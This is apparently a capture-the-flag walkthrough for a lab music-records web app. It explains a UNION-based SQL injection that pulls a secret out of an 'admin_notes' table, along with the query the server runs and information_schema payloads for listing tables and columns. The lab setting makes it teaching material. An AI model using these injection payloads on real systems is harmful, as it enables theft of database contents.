The visible query returns **three** columns (`title`, `artist`, `price`), and the
first one is text. Put the value you want in that first slot and pad the other two
with `NULL`, pulling from the `admin_notes` table:

```
?category=jazz' UNION SELECT secret,NULL,NULL FROM admin_notes-- -
```

Remember the space after `--`. The server ends up running, in effect:

```sql
SELECT title, artist, price FROM records
WHERE category='jazz' UNION SELECT secret,NULL,NULL FROM admin_notes-- -' AND released=1
```

The `secret` (32 hex characters) is rendered as one of the "records" in the list.
Copy it, then hand it to the win endpoint:

```
/solve?token=<the 32-hex secret>
```

A correct token returns the flag; a wrong one returns 403. The secret is random
per instance, so use the one _your_ container printed. (Didn't want to assume the
table name? `UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -`
lists every table, and swapping to `column_name FROM information_schema.columns`
shows you the `secret` column — the same technique, no guessing.)
